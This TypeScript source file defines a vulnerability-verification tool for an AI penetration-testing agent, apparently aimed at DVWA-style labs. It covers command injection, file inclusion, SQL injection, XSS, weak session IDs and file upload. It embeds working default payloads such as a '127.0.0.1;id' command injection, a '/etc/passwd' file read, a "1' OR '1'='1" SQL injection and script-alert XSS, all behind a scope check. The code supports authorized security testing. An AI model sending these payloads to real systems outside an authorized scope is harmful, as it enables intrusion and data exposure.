import { Type } from "typebox";
import type { ToolDefinition } from "@earendil-works/pi-coding-agent";
import type { ToolRuntime } from "../types.js";
import { observeAttackSurface } from "../runtime/coverage-auditor.js";
import { emitToolEvidence, isInScope, jsonResult, resolveTargetUrl, textResult } from "./common.js";
import { sendHttp } from "./http.js";

type VerifyResult = {
  confirmed: boolean;
  reason: string;
  evidence_id?: string;
  requests: Array<{ method: string; url: string; status: number; marker?: string }>;
  details?: Record<string, unknown>;
};

export function createVerifierTool(runtime: ToolRuntime): ToolDefinition<any> {
  return {
    name: "verifier",
    label: "Verifier",
    description: "Run deterministic verification helpers for common web vulnerability classes. Supported classes: command-injection, file-inclusion, sql-injection, xss-reflected, xss-stored, blind-sql-injection, weak-session-id, file-upload.",
    promptSnippet: "Run a deterministic vulnerability verifier",
    promptGuidelines: [
      "Use verifier after discovering a plausible endpoint/parameter to avoid ad hoc incomplete checks.",
      "Treat verifier confirmed=true as evidence for finding(confirm); treat confirmed=false as a negative or inconclusive coverage result with notes.",
      "For state-changing verifiers, use harmless payloads and restore state when needed.",
    ],
    parameters: Type.Object({
      vuln_class: Type.String(),
      url: Type.String(),
      method: Type.Optional(Type.String()),
      param: Type.Optional(Type.String()),
      headers: Type.Optional(Type.Record(Type.String(), Type.String())),
      payload: Type.Optional(Type.String()),
      true_payload: Type.Optional(Type.String()),
      false_payload: Type.Optional(Type.String()),
      samples: Type.Optional(Type.Number()),
      file_field: Type.Optional(Type.String()),
      filename: Type.Optional(Type.String()),
      file_content: Type.Optional(Type.String()),
      fields: Type.Optional(Type.Record(Type.String(), Type.String())),
    }),
    async execute(_toolCallId: string, params: any) {
      const url = resolveTargetUrl(runtime, params.url);
      if (!isInScope(runtime, url)) throw new Error(`out of scope: ${url}`);
      const vulnClass = String(params.vuln_class || "").toLowerCase();
      const headers = params.headers || {};
      const result = await runVerifier(vulnClass, url, params, headers);
      const evidenceId = await emitToolEvidence(runtime, "verifier", `${vulnClass} ${url} -> ${result.confirmed ? "confirmed" : "not confirmed"}`, result);
      result.evidence_id = evidenceId;
      await observeAttackSurface(runtime, {
        method: params.method || "GET",
        url,
        responseBody: JSON.stringify(result),
        evidenceIds: [evidenceId],
        source: "verifier",
      });
      await markVerified(runtime, url, params.param || defaultParam(vulnClass), vulnClass, result, evidenceId);
      return jsonResult(result, { evidenceId });
    },
  };
}

async function runVerifier(vulnClass: string, url: string, params: any, headers: Record<string, string>): Promise<VerifyResult> {
  if (vulnClass === "command-injection") return verifyCommandInjection(url, params, headers);
  if (vulnClass === "file-inclusion") return verifyFileInclusion(url, params, headers);
  if (vulnClass === "sql-injection") return verifySqlInjection(url, params, headers);
  if (vulnClass === "xss-reflected") return verifyReflectedXss(url, params, headers);
  if (vulnClass === "xss-stored") return verifyStoredXss(url, params, headers);
  if (vulnClass === "blind-sql-injection") return verifyBlindSql(url, params, headers);
  if (vulnClass === "weak-session-id") return verifyWeakSessionId(url, params, headers);
  if (vulnClass === "file-upload") return verifyFileUpload(url, params, headers);
  return {
    confirmed: false,
    reason: `unsupported verifier class: ${vulnClass}`,
    requests: [],
  };
}

async function verifyCommandInjection(url: string, params: any, headers: Record<string, string>): Promise<VerifyResult> {
  const param = params.param || "ip";
  const payload = params.payload || "127.0.0.1;id";
  const baselinePayload = params.baseline_payload || "127.0.0.1";
  const baseline = await requestWithParam(url, params.method || "POST", param, baselinePayload, headers);
  const response = await requestWithParam(url, params.method || "POST", param, payload, headers);
  const marker = /\buid=\d+\([^)]*\)|\bgid=\d+\([^)]*\)|www-data|root/.exec(response.body)?.[0];
  const baselineHasMarker = /\buid=\d+\(|\bgid=\d+\(|www-data|root/.test(baseline.body);
  const confirmed = Boolean(marker) && !baselineHasMarker;
  return {
    confirmed,
    reason: confirmed ? "command output marker observed only after injected payload" : "no command output marker observed",
    requests: [
      { method: baseline.method, url: baseline.url, status: baseline.status, marker: "baseline" },
      { method: response.method, url: response.url, status: response.status, marker: marker || undefined },
    ],
    details: {
      param,
      baseline_payload: baselinePayload,
      injected_payload: payload,
      baseline_length: baseline.body.length,
      injected_length: response.body.length,
      marker,
      response_excerpt: marker ? excerptAround(response.body, marker) : response.body.slice(0, 500),
    },
  };
}

async function verifyFileInclusion(url: string, params: any, headers: Record<string, string>): Promise<VerifyResult> {
  const param = params.param || "page";
  const payload = params.payload || "/etc/passwd";
  const baselinePayload = params.baseline_payload || "include.php";
  const baseline = await requestWithParam(url, "GET", param, baselinePayload, headers);
  const response = await requestWithParam(url, "GET", param, payload, headers);
  const marker = /root:x:0:0:[^\n<]*|www-data:x:[^\n<]*/i.exec(response.body)?.[0];
  const confirmed = Boolean(marker) && !baseline.body.includes(marker || "\u0000");
  return {
    confirmed,
    reason: confirmed ? "local file content marker observed only after traversal/include payload" : "no local file marker observed",
    requests: [
      { method: baseline.method, url: baseline.url, status: baseline.status, marker: "baseline" },
      { method: response.method, url: response.url, status: response.status, marker: marker || undefined },
    ],
    details: {
      param,
      baseline_payload: baselinePayload,
      injected_payload: payload,
      baseline_length: baseline.body.length,
      injected_length: response.body.length,
      marker,
      response_excerpt: marker ? excerptAround(response.body, marker) : response.body.slice(0, 500),
    },
  };
}

async function verifySqlInjection(url: string, params: any, headers: Record<string, string>): Promise<VerifyResult> {
  const param = params.param || "id";
  const baselinePayload = params.baseline_payload || "1";
  const payload = params.payload || "1' OR '1'='1";
  const baseline = await requestWithParam(url, params.method || "GET", param, baselinePayload, headers);
  const response = await requestWithParam(url, params.method || "GET", param, payload, headers);
  const marker = /First name:|Surname:|SQL syntax|You have an error|MariaDB|MySQL|admin/i.exec(response.body)?.[0];
  const confirmed = Boolean(marker) && meaningfulDifference(baseline.body, response.body);
  return {
    confirmed,
    reason: confirmed ? "SQL payload produced database-specific or semantic response difference" : "SQL payload did not produce a meaningful difference",
    requests: [
      { method: baseline.method, url: baseline.url, status: baseline.status, marker: "baseline" },
      { method: response.method, url: response.url, status: response.status, marker: marker || undefined },
    ],
    details: {
      param,
      baseline_payload: baselinePayload,
      injected_payload: payload,
      baseline_length: baseline.body.length,
      injected_length: response.body.length,
      marker,
      response_excerpt: marker ? excerptAround(response.body, marker) : response.body.slice(0, 500),
    },
  };
}

async function verifyReflectedXss(url: string, params: any, headers: Record<string, string>): Promise<VerifyResult> {
  const param = params.param || "name";
  const payload = params.payload || "<script>alert(1)</script>";
  const baselinePayload = params.baseline_payload || "node2-baseline";
  const baseline = await requestWithParam(url, params.method || "GET", param, baselinePayload, headers);
  const response = await requestWithParam(url, params.method || "GET", param, payload, headers);
  const reflected = response.body.includes(payload);
  const baselineReflected = baseline.body.includes(payload);
  const executableContext = reflected && /<pre>\s*Hello\s*<script>alert\(1\)<\/script>|<script>alert\(1\)<\/script>/i.test(response.body);
  const confirmed = reflected && !baselineReflected && executableContext;
  return {
    confirmed,
    reason: confirmed ? "payload reflected verbatim in executable HTML context" : reflected ? "payload reflected but executable context was not proven" : "payload not reflected verbatim",
    requests: [
      { method: baseline.method, url: baseline.url, status: baseline.status, marker: "baseline" },
      { method: response.method, url: response.url, status: response.status, marker: reflected ? payload : undefined },
    ],
    details: {
      param,
      baseline_payload: baselinePayload,
      injected_payload: payload,
      baseline_length: baseline.body.length,
      injected_length: response.body.length,
      executable_context: executableContext,
      response_excerpt: reflected ? excerptAround(response.body, payload) : response.body.slice(0, 500),
    },
  };
}

async function verifyStoredXss(url: string, params: any, headers: Record<string, string>): Promise<VerifyResult> {
  const payload = params.payload || "<svg/onload=alert(1)>";
  const fields = { ...(params.fields || {}) };
  if (!Object.keys(fields).length) {
    fields.txtName = "x";
    fields.mtxMessage = payload;
    fields.btnSign = "Sign Guestbook";
  }
  const post = await sendHttp({ method: "POST", url, headers: { "content-type": "application/x-www-form-urlencoded", ...headers }, body: new URLSearchParams(fields).toString() });
  const get = await sendHttp({ method: "GET", url, headers });
  const confirmed = get.body.includes(payload);
  return {
    confirmed,
    reason: confirmed ? "payload persisted after second retrieval" : "payload was not observed on second retrieval",
    requests: [
      { method: "POST", url, status: post.status },
      { method: "GET", url, status: get.status, marker: confirmed ? payload : undefined },
    ],
    details: {
      payload,
      fields: Object.keys(fields),
      post_length: post.body.length,
      get_length: get.body.length,
      response_excerpt: confirmed ? excerptAround(get.body, payload) : get.body.slice(0, 500),
    },
  };
}

async function verifyBlindSql(url: string, params: any, headers: Record<string, string>): Promise<VerifyResult> {
  const param = params.param || "id";
  const truePayload = params.true_payload || "1 AND 1=1";
  const falsePayload = params.false_payload || "1 AND 1=2";
  const trueResponse = await requestWithParam(url, "GET", param, truePayload, headers);
  const falseResponse = await requestWithParam(url, "GET", param, falsePayload, headers);
  const confirmed = meaningfulDifference(trueResponse.body, falseResponse.body) || trueResponse.status !== falseResponse.status;
  const trueMarker = /User ID exists|First name:|Surname:|exists/i.exec(trueResponse.body)?.[0];
  const falseMarker = /User ID is MISSING|missing|does not exist/i.exec(falseResponse.body)?.[0];
  return {
    confirmed,
    reason: confirmed ? "controlled true/false payloads produced different responses" : "true/false payloads did not produce a meaningful difference",
    requests: [
      { method: "GET", url: trueResponse.url, status: trueResponse.status, marker: trueMarker || "true-predicate" },
      { method: "GET", url: falseResponse.url, status: falseResponse.status, marker: falseMarker || "false-predicate" },
    ],
    details: {
      param,
      true_payload: truePayload,
      false_payload: falsePayload,
      true_length: trueResponse.body.length,
      false_length: falseResponse.body.length,
      true_marker: trueMarker,
      false_marker: falseMarker,
      true_excerpt: trueMarker ? excerptAround(trueResponse.body, trueMarker) : trueResponse.body.slice(0, 300),
      false_excerpt: falseMarker ? excerptAround(falseResponse.body, falseMarker) : falseResponse.body.slice(0, 300),
    },
  };
}

async function verifyWeakSessionId(url: string, params: any, headers: Record<string, string>): Promise<VerifyResult> {
  const samples = Math.max(3, Math.min(Number(params.samples || 5), 20));
  const values: string[] = [];
  const requests: VerifyResult["requests"] = [];
  for (let i = 0; i < samples; i += 1) {
    const response = await sendHttp({ method: "GET", url, headers });
    requests.push({ method: "GET", url, status: response.status });
    const cookie = response.headers["set-cookie"] || "";
    const match = /(?:^|,\s*)([^=;,]+)=([^;,]+)/.exec(cookie);
    if (match) values.push(match[2]);
  }
  const confirmed = values.length >= 3 && looksSequential(values);
  return {
    confirmed,
    reason: confirmed ? "session/token samples look sequential or low-variance" : "session/token samples did not show a simple predictable pattern",
    requests,
    details: { samples: values },
  };
}

async function verifyFileUpload(url: string, params: any, headers: Record<string, string>): Promise<VerifyResult> {
  const boundary = `----node2-${Date.now().toString(16)}`;
  const fileField = params.file_field || "uploaded";
  const filename = params.filename || "node2-proof.txt";
  const fileContent = params.file_content || "NODE2_UPLOAD_PROOF";
  const fields = { ...(params.fields || {}), btnUpload: params.fields?.btnUpload || "Upload" };
  const body = multipartBody(boundary, fields, fileField, filename, fileContent);
  const response = await sendHttp({ method: "POST", url, headers: { ...headers, "content-type": `multipart/form-data; boundary=${boundary}` }, body });
  const confirmed = response.body.includes(filename) || response.body.includes("uploaded") || response.body.includes("succesfully");
  return result(confirmed, confirmed ? "upload response indicates file was accepted" : "upload response did not indicate success", { method: "POST", url, status: response.status, body: response.body }, filename);
}

async function requestWithParam(url: string, method: string, param: string, payload: string, headers: Record<string, string>): Promise<{ method: string; url: string; status: number; body: string }> {
  if (method.toUpperCase() === "POST") {
    const body = new URLSearchParams({ [param]: payload, Submit: "Submit" }).toString();
    const response = await sendHttp({ method: "POST", url, headers: { "content-type": "application/x-www-form-urlencoded", ...headers }, body });
    return { method: "POST", url, status: response.status, body: response.body };
  }
  const target = new URL(url);
  target.searchParams.set(param, payload);
  if (!target.searchParams.has("Submit")) target.searchParams.set("Submit", "Submit");
  const response = await sendHttp({ method: "GET", url: target.toString(), headers });
  return { method: "GET", url: target.toString(), status: response.status, body: response.body };
}

function result(confirmed: boolean, reason: string, response: { method: string; url: string; status: number; body: string }, marker?: string): VerifyResult {
  return {
    confirmed,
    reason,
    requests: [{ method: response.method, url: response.url, status: response.status, marker }],
    details: { response_length: response.body.length },
  };
}

async function markVerified(runtime: ToolRuntime, rawUrl: string, param: string, vulnClass: string, result: VerifyResult, evidenceId: string): Promise<void> {
  const endpoint = new URL(rawUrl).pathname;
  await runtime.coverage.mark({
    endpoint,
    param,
    vulnClass,
    status: result.confirmed ? "failed" : "passed",
    notes: result.reason,
  });
  runtime.plan.upsert({
    node_id: `plan-test-${slug(`${endpoint}-${param}-${vulnClass}`)}`,
    title: `Verify ${vulnClass} on ${param}`,
    status: "done",
    kind: "test",
    level: "work_item",
    parent_id: "plan-objective-analysis-test-plan",
    method: "VERIFIER",
    endpoint,
    parameter: param,
    vuln_type: vulnClass,
    result: result.confirmed ? "confirmed" : "negative",
    notes: result.reason,
    evidence_ids: [evidenceId],
    priority: 230,
    source: "verifier",
  });
}

function defaultParam(vulnClass: string): string {
  if (vulnClass === "command-injection") return "ip";
  if (vulnClass === "file-inclusion") return "page";
  if (vulnClass === "sql-injection") return "id";
  if (vulnClass === "xss-reflected") return "name";
  if (vulnClass === "xss-stored") return "txtName,mtxMessage";
  if (vulnClass === "blind-sql-injection") return "id";
  if (vulnClass === "file-upload") return "uploaded";
  if (vulnClass === "weak-session-id") return "session";
  return "-";
}

function meaningfulDifference(left: string, right: string): boolean {
  if (left === right) return false;
  const delta = Math.abs(left.length - right.length);
  return delta > 20 || /exists|missing|true|false|error/i.test(`${left}\n${right}`);
}

function excerptAround(value: string, marker: string): string {
  const index = value.indexOf(marker);
  if (index < 0) return value.slice(0, 500);
  const start = Math.max(0, index - 180);
  const end = Math.min(value.length, index + marker.length + 180);
  return value.slice(start, end).replace(/\s+/g, " ").trim();
}

function looksSequential(values: string[]): boolean {
  const numeric = values.map((value) => Number(value)).filter((value) => Number.isFinite(value));
  if (numeric.length >= 3) {
    const diffs = numeric.slice(1).map((value, index) => value - numeric[index]);
    if (new Set(diffs).size <= 2) return true;
  }
  return new Set(values).size <= Math.max(1, Math.floor(values.length / 2));
}

function multipartBody(boundary: string, fields: Record<string, string>, fileField: string, filename: string, fileContent: string): string {
  const chunks: string[] = [];
  for (const [key, value] of Object.entries(fields)) {
    chunks.push(`--${boundary}\r\nContent-Disposition: form-data; name="${key}"\r\n\r\n${value}\r\n`);
  }
  chunks.push(`--${boundary}\r\nContent-Disposition: form-data; name="${fileField}"; filename="${filename}"\r\nContent-Type: text/plain\r\n\r\n${fileContent}\r\n`);
  chunks.push(`--${boundary}--\r\n`);
  return chunks.join("");
}

function slug(value: string): string {
  return value.toLowerCase().replace(/[^a-z0-9]+/g, "-").replace(/(^-|-$)/g, "").slice(0, 100) || "item";
}
